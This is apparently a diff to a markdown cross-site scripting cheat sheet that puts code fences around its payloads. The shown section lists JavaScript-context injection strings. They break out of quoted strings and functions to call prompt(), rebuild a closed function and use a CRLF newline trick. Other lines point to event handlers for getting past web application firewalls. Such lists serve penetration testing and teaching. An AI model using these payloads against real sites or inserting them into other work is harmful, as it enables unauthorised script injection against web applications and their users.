@@ -24,24 +24,28 @@ Did they block onerror onload onclick? Try something like this:
 
 Don't forget the injection might not be a form tag but in the javascript.
 ==============
+```javascript
 ";prompt(1);//
 
 ';prompt(1);//
+```
 
 What if they are in a function? Break out of it. Count the brackets, etc to kill the function.
-
+```javascript
 "};prompt(1);//
-
+```
 You may need to reconstruct the function
-
+```javascript
 "};prompt(1);function whatever(){//
+```
 
 Don't forget %0D%0A if you need a new line
 
 Obscure Breakout
 ==============
+```html
 a'*prompt(123)*'
-
+```
 Event Handlers You Should Investigate to bypass WAF
 ==============
 https://www.w3.org/TR/html52/single-page.html
